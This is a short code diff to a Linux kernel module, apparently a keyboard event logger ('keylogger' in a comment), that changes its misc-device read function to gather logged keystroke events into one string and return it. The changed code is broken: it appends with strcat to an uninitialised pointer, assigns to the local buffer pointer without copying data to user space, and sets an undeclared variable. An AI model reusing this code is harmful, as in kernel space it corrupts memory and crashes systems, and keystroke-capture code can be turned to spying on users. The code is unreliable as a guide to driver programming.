@@ -30,19 +30,19 @@ static int ft_module_keyboard_open(struct inode * node, struct file * file)
 
 static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, loff_t * offset)
 {
-	ft_log("Misc device read");
-
 	struct list_head *head_ptr;
 	struct event_struct *entry;
 	char *output_str;
+	char *temp_str;
 	
+	total_read_len = 0;
 	head_ptr = &(g_driver->events_head->list);
 	do
 	{
 		entry = list_entry(head_ptr, struct event_struct, list);
-		output_str = event_to_str(*entry);
-		printk("%s", output_str);
-		kfree(output_str);
+		temp_str = event_to_str(*entry);
+		output_str = strcat(output_str, temp_str);
+		kfree(temp_str);
 		head_ptr = head_ptr->next;
 	} while (head_ptr != &(g_driver->events_head->list));
 
@@ -57,8 +57,8 @@ static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, lo
 	// 	ptr = ptr->next;
 	// } while (ptr != &(keylogger->list));
 	
-	
-	return 0;
+	buff = output_str;
+	return strlen(output_str);
 }
 
 
